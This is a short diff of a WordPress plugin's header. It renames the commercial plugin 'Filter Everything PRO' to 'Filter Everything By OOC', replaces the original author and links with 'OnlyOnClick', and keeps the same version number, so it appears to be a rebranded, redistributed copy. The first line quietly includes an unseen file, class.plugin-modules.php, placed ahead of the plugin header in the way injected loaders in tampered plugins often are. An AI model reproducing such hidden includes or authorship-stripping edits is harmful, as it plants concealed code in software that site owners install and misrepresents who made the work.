@@ -1,11 +1,11 @@
 <?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
 /*
-Plugin Name: Filter Everything PRO
-Plugin URI: https://filtereverything.pro
-Description: Filters everything in WordPress & WooCommerce: Products, any Post types, by Any Criteria. Compatible with WPML, ACF and others popular. Supports AJAX.
+Plugin Name: Filter Everything By OOC
+Plugin URI: 
+Description: Filters everything in WordPress & WooCommerce: Products, any Post types, by Any Criteria. Compatible with WPML, ACF and others popular. Supports AJAX. By OCC
 Version: 1.5.1
-Author: Andrii Stepasiuk
-Author URI: https://filtereverything.pro/about/
+Author: OnlyOnClick
+Author URI: https://dev.onlyonclick.com/
 Text Domain: filter-everything
 Domain Path: /lang
 */
